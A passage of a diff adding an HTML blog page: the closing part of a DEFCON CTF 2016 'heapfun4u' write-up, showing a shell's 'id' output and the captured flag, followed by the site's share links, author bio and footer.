+See<span class="w"> </span><span class="s2">&quot;man sudo_root&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>details.
+
+vagrant@ubuntu-wily-15:/home/vagrant$<span class="w"> </span>id
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>vagrant<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>vagrant<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>vagrant<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span><span class="w"> </span>vagrant@ubuntu-wily-15:/home/vagrant$
+</code></pre></div>
+
+<p>At that time, my teammate from TheGoonies <a class="fa fa-twitter" href="https://twitter.com/rick2600" target="_blank"> @rick2600</a> had also read the flag file, which was:</p>
+<div class="highlight"><pre><span></span><code>The flag is: Oh noze you pwned my h33p.
+</code></pre></div>
+            </section>
+
+
+            <section class="post-info">
+                <div class="post-share">
+                    <a class="twitter" href="https://twitter.com/share?text=DEFCON CTF 2016 - heapfun4u&amp;url=https://blahcat.github.io/posts/2016/05/24/defcon-ctf-2016-heapfun4u.html" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="ic ic-twitter"></i><span class="hidden">Twitter</span>
+                    </a>
+                    <a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blahcat.github.io/posts/2016/05/24/defcon-ctf-2016-heapfun4u.html" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="ic ic-facebook"></i><span class="hidden">Facebook</span>
+                    </a>
+                    <a class="googleplus" href="https://plus.google.com/share?url=https://blahcat.github.io/posts/2016/05/24/defcon-ctf-2016-heapfun4u.html" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="ic ic-googleplus"></i><span class="hidden">Google+</span>
+                    </a>
+                    <div class="clear"></div>
+                </div>
+
+                
+              
+                <aside class="post-tags">
+<a href="https://blahcat.github.io/tag/pwn">pwn</a><a href="https://blahcat.github.io/tag/defcon-2016">defcon-2016</a><a href="https://blahcat.github.io/tag/x86">x86</a><a href="https://blahcat.github.io/tag/heap">heap</a>                </aside>
+              
+               <a title="Category" style="font-weight: bold;" class="category_link" href="https://blahcat.github.io/category/ctf">ctf</a>
+
+                <div class="clear"></div>
+
+                <aside class="post-discussions">
+                    <div id="discussion_thread">
+                      Continue the discussion on
+                      <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=DEFCON CTF 2016 - heapfun4u">
+                        <i class="fa fa-github fa-lg"></i>
+                        GitHub
+                      </a>
+                      <div class="clear"></div>
+                    </div>
+                  </aside>
+
+
+                <aside class="post-author">
+
+
+                        <figure class="post-author-avatar">
+                            <img src="https://blahcat.github.io/assets/images/authors/hugsy.png" alt="hugsy" />
+                        </figure>
+                    <div class="post-author-bio">
+                        <h4 class="post-author-name"><a href="https://blahcat.github.io/author/hugsy">hugsy</a></h4>
+                            <p class="post-author-about">BWAAAAHHHH</p>
+                            <span class="post-author-website"><a href="/author/hugsy"><i class="ic ic-link"></i> Website</a></span>
+                        <!-- Social linkes in alphabet order. -->
+                            <span class="post-author-github"><a target="_blank" href="https://github.com/hugsy"><i class="ic ic-link"></i> GitHub</a></span>
+                            <span class="post-author-twitter"><a target="_blank" href="https://twitter.com/_hugsy_"><i class="ic ic-twitter"></i> Twitter</a></span>
+                    </div>
+                    <div class="clear"></div>
+                </aside>
+
+                </section>
+
+                <aside class="post-nav">
+                    <a class="post-nav-next" href="https://blahcat.github.io/posts/2016/06/13/armpwn-challenge-write-up.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-left"></i>
+                                <h2 class="post-nav-title">ARMPWN challenge write-up</h2>
+                            <p class="post-nav-excerpt">Info A few weeks ago, I came across a GitHub repository created by @5aelo called...</p>
+                        </section>
+                    </a>
+                    <a class="post-nav-prev" href="https://blahcat.github.io/posts/2016/05/23/defcon-ctf-2016-feedme.html">
+                        <section class="post-nav-teaser">
+                            <i class="ic ic-arrow-right"></i>
+                                <h2 class="post-nav-title">DEFCON CTF 2016 - feedme</h2>
+                            <p class="post-nav-excerpt">Info The vulnerable file was given with the instructions: Don't forget to feed me...</p>
+                        </section>
+                    </a>
+                    <div class="clear"></div>
+                </aside>
+
+            </div>
+        </article>
+    </main>
+      <!-- TODO : Body class -->
+    <div id="body-class" style="display: none;" class=""></div>
+
+    <footer id="footer">
+      <div class="inner">
+        <section class="credits">
+          <span class="credits-theme"><a class="fa fa-twitter fa-3x" href="https://twitter.com/ctf_blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-github fa-3x" href="https://github.com/blahcat" target="_blank"></a>&nbsp;&nbsp;<a class="fa fa-youtube fa-3x" href="https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg" target="_blank"></a></span>
+          <span class="credits-software">Powered by <a href="https://github.com/getpelican/pelican" rel="nofollow">Pelican</a> and <a href="https://github.com/arulrajnet/attila" rel="nofollow">Attila</a> theme</span>
+        </section>
+      </div>
+    </footer>
+  </section>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script type="text/javascript" src="https://blahcat.github.io/theme/js/script.js"></script>
+
+    <!-- Script specified by the user -->
+    <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js"></script>
+</body>
+</html>
